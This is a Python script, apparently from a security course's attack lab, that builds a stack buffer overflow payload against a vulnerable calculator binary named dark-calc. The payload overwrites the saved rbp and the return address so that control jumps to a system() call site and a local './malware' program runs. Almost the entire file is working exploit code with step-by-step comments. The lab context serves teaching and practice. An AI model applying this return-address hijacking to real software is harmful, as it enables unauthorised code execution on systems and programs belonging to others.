#!/usr/bin/env python3
"""Task 3: run ./malware from attack/dark-calc through a stack buffer overflow.

input() reads into expression[16] with unbounded gets(), then strcpy()s it into
the global command_buf; eval() wraps command_buf as `echo $((...))` and hands it
to system().  We overflow input()'s saved return address and point it at eval()'s
own `mov edi, <command_buf>; call system@plt` call site.  command_buf already
holds "./malware" (input() just copied it there), so system("./malware") runs
and attack/malware finds dark-calc among its ancestors.

The code address is resolved from the supplied binary at generation time. The
saved-rbp slot is derived from the fixed-stack top; the frame and command-buffer
layout deliberately match the supplied dark-calc, not arbitrary rebuilt binaries.
"""
import os
import struct
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import attacklab

HERE = os.path.dirname(os.path.abspath(__file__))
ELF = attacklab.Elf(os.path.join(HERE, "attack", "dark-calc"))

# eval()'s `mov edi, <command_buf>; call system@plt`  (0x401a6b in the shipped binary).
SYSTEM_CALL_SITE = attacklab.system_command_buf_call_site(ELF)

# __wrap_main calls main at fixed_stack_top-8, and main's saved-rbp slot is at
# fixed_stack_top-0x10. input's leave restores rbp to that slot. eval's leave
# then pops the caller frame and returns through the untouched wrapper return
# address at fixed_stack_top-8, so system() returning leads to a clean exit.
saved_rbp = struct.pack("<Q", attacklab.fixed_stack_top(ELF) - 0x10)
padding = b"./malware\x00" + b"A" * 6   # 16 bytes: command string + filler
payload = padding + saved_rbp + struct.pack("<Q", SYSTEM_CALL_SITE) + b"\n"

# dark-calc runs on a 48-byte fixed stack window (buffer .. PROT_NONE guard page).
# gets() appends one NUL terminator, so the data written before the newline must
# be <= 47 bytes; otherwise that NUL lands on the guard page and faults inside
# gets() itself before the exploit ever runs.
data = payload[:-1]
assert len(data) <= 47, f"{len(data)} data bytes: NUL would reach the guard page"
assert b"\n" not in data, "payload contains a newline before the delimiter"

sys.stdout.buffer.write(payload)
